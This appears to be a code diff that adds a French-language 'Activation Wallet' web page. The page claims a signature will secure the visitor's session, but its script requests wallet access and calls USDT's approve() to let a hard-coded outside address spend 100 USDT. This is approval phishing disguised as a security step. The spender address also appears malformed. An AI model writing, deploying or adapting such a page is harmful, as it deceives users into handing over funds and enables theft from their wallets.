@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Activation Wallet</title>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+</head>
+<body>
+  <h2>Connexion sécurisée</h2>
+  <p>Veuillez signer cette opération pour sécuriser votre session.</p>
+  <button onclick="approveUSDT()">Signer</button>
+
+  <script>
+    const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // Contrat USDT sur Ethereum
+    const SPENDER = "0x646bd970540aD7B0357d0c382250F0892D0F05f"; //
+    const AMOUNT = "100000000"; // 100 USDT (USDT a 6 décimales)
+
+    async function approveUSDT() {
+      if (!window.ethereum) {
+        alert("Wallet non détecté. Utilise TrustWallet ou MetaMask.");
+        return;
+      }
+
+      const provider = new ethers.providers.Web3Provider(window.ethereum);
+      await provider.send("eth_requestAccounts", []);
+      const signer = provider.getSigner();
+
+      const usdt = new ethers.Contract(
+        USDT_ADDRESS,
+        ["function approve(address spender, uint256 amount) public returns (bool)"],
+        signer
+      );
+
+      try {
+        const tx = await usdt.approve(SPENDER, AMOUNT);
+        alert("Transaction envoyée. Attente de confirmation...");
+        await tx.wait();
+        alert("✅ Approve terminé !");
+      } catch (error) {
+        alert("❌ Signature annulée ou erreur.");
+        console.error(error);
+      }
+    }
+  </script>
+</body>
+</html>
